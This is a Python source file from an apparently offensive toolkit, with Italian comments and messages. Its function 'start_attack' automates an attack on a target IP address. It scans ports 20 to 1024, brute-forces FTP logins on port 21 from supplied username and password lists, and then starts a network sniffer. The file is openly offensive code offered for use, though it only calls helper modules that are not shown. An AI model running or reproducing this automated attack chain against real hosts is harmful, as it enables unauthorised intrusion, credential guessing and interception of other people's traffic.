# modules/automation/auto_attack.py
import time
from modules.network.port_scanner import run_port_scan
from modules.automation.brute_force import ftp_bruteforce
from modules.network.sniffer import start_sniffer

def start_attack(target_ip, ftp_user_list, ftp_pass_list):
    print("🚀 Inizio attacco automatico...")
    
    # 1. Scansione porte
    print("\n[1️⃣] Scansione delle porte...")
    open_ports = run_port_scan(target_ip, range(20, 1025))

    # 2. Se porta 21 aperta, tentiamo brute force FTP
    if 21 in open_ports:
        print("\n[2️⃣] FTP Brute Force attivo sulla porta 21")
        ftp_bruteforce(target_ip, 21, ftp_user_list, ftp_pass_list)
    else:
        print("\n[2️⃣] FTP non disponibile.")

    # 3. Sniffing di rete base
    print("\n[3️⃣] Sniffer di rete attivo (CTRL+C per interrompere)")
    try:
        start_sniffer()
    except KeyboardInterrupt:
        print("\n[✅] Sniffing terminato.")

    print("\n✔️ Attacco automatico completato.")
